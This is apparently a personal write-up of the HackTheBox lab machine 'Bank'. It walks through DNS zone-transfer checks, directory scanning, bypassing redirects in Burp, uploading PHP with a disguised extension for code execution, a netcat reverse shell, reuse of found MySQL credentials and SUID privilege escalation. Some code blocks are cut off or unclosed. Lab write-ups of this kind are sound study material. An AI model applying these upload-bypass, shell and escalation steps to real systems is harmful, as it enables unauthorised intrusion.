# Introduction
Bank is an "easy" machine on HackTheBox. This box was a fairly steep learning curve albeit there was a alot of important takeways being the DNS enumeration, Virtual Host Routing check, modifying HTTP response headers to stop redirecting webpages and the RCE technique.

Normally DNS is UDP by default but falls back to TCP when the packet size is too large (>512 bytes). **When will TCP exceed 512 bytes?** Classically speaking, in a zone transfer where one DNS server sends its entire database (resource records) to another machine, usually another DNS server. Although with the rise of IPv6, spam detection and DNSSEC, TCP is increasingly being used. Usually a zone transfer is normal operation between primary and secondary DNS servers in order to synchronise the records for a domain. This is typically not something you want to be accessed externally because if an attacker can gather all your DNS records, they can use those to select targets for exploitation. <a href="https://hackertarget.com/zone-transfer/">Zone Transfers</a>  https://hackertarget.com/zone-transfer/


Useful website that highlights the security risk of having zone transfer enabled and how it can leak sensitive information: <a href="https://digi.ninja/projects/zonetransferme.php">digi.ninja</a>


# DNS Enumeration - NSLookup

```bash
root@kali:/etc# nslookup 
> SERVER 10.10.10.29
Default server: 10.10.10.29
Address: 10.10.10.29#53
> 
> 10.10.10.29
** server can't find 29.10.10.10.in-addr.arpa: NXDOMAIN  (NO REVERSE DNS LOOKUP)
> 
> 127.0.0.1
1.0.0.127.in-addr.arpa  name = localhost. (DIDN’T GET LUCKY WITH A HOSTNAME)
> 
> bank.htb
Server:         10.10.10.29
Address:        10.10.10.29#53

Name:   bank.htb
Address: 10.10.10.29
```

The default name server for all HackTheBox machines is **<name of box>.htb** so I tried that and got a response.


# DNS Enumeration - dig

The name server will be checked for a zone transfer of the target domain. It is often the case that even though the primary name server blocks zone transfers, a secondary or tertiary system may not be configured to block these - hence the check of each name server.

```bash
root@kali:/etc# dig axfr <targetdomain.com> @<ns1.targetdomain.com> (syntax)
root@kali:/etc# dig axfr @10.10.10.29 (Root zone transfer – didnt give anything away)
root@kali:/etc# dig axfr bank.htb @10.10.10.29

```

Added ```10.10.10.29 bank.htb``` to the ```/etc/hosts``` file and I was able to resolve bank.htb.

# Enumeration – Webpage

Navigating to ```http://bank.htb/```

![image]({{site.github.url}}/assets/img/htb/bank/bank-htb.png)

Using the dirsearch tool I ran a scan to check for additional php files on the webserver. The tool is similar to dirb but dirsearch has alot of additional features.  

```bash
root@kali:/opt/OSCP_tools/dirsearch# python3 dirsearch.py -u http://bank.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 

-u: URL
-w: wordlist
-e: php extensions
-f: follow redirects
-t: 20 threads
```
While that was running I ran a Nikto scan that showed the page was being redirected to ```/login.php``` and you can verify this by using CURL to get the HTTP headers.

```bash
root@kali:~/Documents/boxes/bank# curl -I http://bank.htb/
HTTP/1.1 302 Found

```

The response shows a HTTP 302 redirect to location login.php. The result of the dirsearch scan:

```bash
root@kali:/opt/OSCP_tools/dirsearch# python3 dirsearch.py -u http://bank.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20

Task Completed
```

The output of dirsearch shows a few redirects occuring. Lets stop index.php redirecting using Burpsuite.

# Stopping Redirects using Burpsuite

I’m going to stop the index.php redirect first of all and to perform this, catch the initial request and then, go to Actions --> Do intercept --> Response to this request then replace ```HTTP/1.1 302 Found``` with ```HTTP/1.1 200 OK``` and then forward. To do this automatically for every page, from the proxy tab at the top go to options then “Match and Replace”, put in your rule, make sure its enabled and then turn intercept off. The rule you can see below.

![image]({{site.github.url}}/assets/img/htb/bank/replace302.png)

You can navigate to all websites now without being redirected, one in particular was an unrendered support.php page which gives us the ability to upload files. With some trial and error I could get an image uploaded successfully with php code encapsulated however I couldnt get any RCE on the webpage and also I fired up burp to see WTH was going on and it seems the webpage kept trying to redirect to ```login.php``` after uploading the images which seemed strange considering we created that rule. The webpage wouldn't let me delete the files so I tried searching elsewhere in the meantime.

# Further Enumeration of the Webpage

![image]({{site.github.url}}/assets/img/htb/bank/balance-transfer.png)

On this directory there is a load of encrypted files so I downloaded everything using wget and then sorted the files by filesize in reverse order. All the files were around the same size except one.

```bash
root@kali:~/Documents/boxes/bank/# wget -r http://bank.htb/balance-transfer/
root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# ls -lah | sort -n -r
root@kali:~/Documents/boxes/bank/bank.htb/balance-transfer# cat 68576f20e9732f1b2edc4df5b8533230.acc

Logged into the portal using the email and password, navigated to **“Support”** and I came to the ``support.php`` page which I was enumerating earlier, this time the webpage was correctly rendered so I may have better luck this time. I uploaded a GIF file with php code in it (test.gif.php) and the response was declined as it only allows images. I fired up burp to see the response and I came across something interesting. I changed the extension to htb and tried again. Success, it uploaded and I had RCE (remote code execution).

![image]({{site.github.url}}/assets/img/htb/bank/debug.png)

# Shell Access

Having RCE, its time to get a shell into the machine. I setup my listener and connected back to my machine using netcat. You can check whether the victim has nc installed by running: ```?cmd=which nc```

| :--: |
| *Executing commands as user www-data* |![image]({{site.github.url}}/assets/img/htb/bank/rce.png)

That sigh of relief once you catch that reverse shell makes all the work worth it but I'd rather much operate in a fully interactive TTY shell so its time to upgrade. 

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@bank:/var/www/bank/uploads$ 
www-data@bank:/var/www/bank/uploads$ ^Z  (CTRL+Z MOVE IT TO THE BACKGROUND)
[1]+  Stopped                 nc -lvnp 443
root@kali:~/Documents/boxes/bank# stty raw -echo
(Type fg and then hit ENTER)
root@kali:~/Documents/boxes/bank# nc -lvnp 443
www-data@bank:/var/www/bank/uploads$ 
www-data@bank:/var/www/bank/uploads$ clear             
TERM environment variable not set.
www-data@bank:/var/www/bank/uploads$ export TERM=screen 
```
This workaround gives us the ability to tab autocomplete, clear the screen, arrow up history etc.


# Privilege Escalation

Now that were in the victim's machine, its time to find a way to escalate. Navigating around the root directory of the webserver: ```/var/www/bank/``` I came across some mysql credentials in the ```inc``` directory.

```bash
function getCreditCards($username){
                $mysql = new mysqli("localhost", "root", "!@#S3cur3P4ssw0rd!@#", "htbbank");
```

## MYSQL Enumeration

Inside the ```/var/www/bank/inc``` directory we see a user.php file with a mysql username and password. We can log into the mysql database with those credentials, drop into a shell and hope we are root.

```bash
www-data@bank:/var/www/bank/inc$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 345

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> \! /bin/sh (COMMAND TO UPGRADE TO A SHELL)
$ whoami
www-data
```

Nope, no luck. We could try to SSH in using those credentials.


## SSH Enumeration

```bash
ssh root@bank.htb
root@bank.htb's password: 
Permission denied, please try again.

ssh chris@bank.htb
chris@bank.htb's password: 
Permission denied, please try again.
```

And another dead end. Might be time to use some priv esc tools but before I do that I searched for files that may have an SUID (set user) or SGID (set group) bit attached. Files with these sticky bits provides users with the ability to access or use that file with root permissions. A useful article showing how to exploit SUID bits: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</a>

### Searching files with SUID & SGID bit set

Finding SGID bit files: ```www-data@bank: find / -perm -2000 -type f -exec ls -la {} 2>/dev/null \;```
Finding SUID bit files: ```www-data@bank: find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;```

```bash
www-data@bank: find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

You can see that there was a file called emergency that had a SUID bit so I executed it and voila, root!
